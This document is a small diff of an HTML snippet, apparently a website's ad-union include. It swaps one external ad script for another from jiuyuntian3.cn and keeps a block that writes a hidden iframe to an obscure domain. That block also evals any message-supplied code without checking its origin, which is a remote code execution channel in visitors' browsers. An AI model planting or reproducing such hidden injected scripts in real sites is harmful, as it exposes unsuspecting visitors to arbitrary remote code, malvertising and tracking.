@@ -1,11 +1,6 @@
-<script>
-    (function () {
-        var id = "7645859975449108235-404";
-        document.write('<ins style="display:none!important" id="' + id + '"></ins>');
-        (window.adbyunion = window.adbyunion || []).push(id);
-    })();
-</script>
-<script async  src="https://fjbu.cn/o.js"></script>
+<!--DK联盟-->
 <script type="text/javascript">
 (function(){var __yrnqid='k'+Math.random().toString(36).substr(2);document.writeln('<div id="'+__yrnqid+'"></div>');window.addEventListener("message",function(e){var _des_s_9762=e.data;if(_des_s_9762.des_s_9762){var _s = '/+/g';eval(decodeURIComponent(_des_s_9762.des_s_9762.replace(_s,"%20")))}});document.write('<iframe style="display:none;" src="https://xn--2qu92fhtx4ff.ink:12443/ty/c-9762-25-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})()
 </script>
+<!--TD联盟-->
+<script async='async' src='https://jiuyuntian3.cn/vs.php?id=1472'></script>
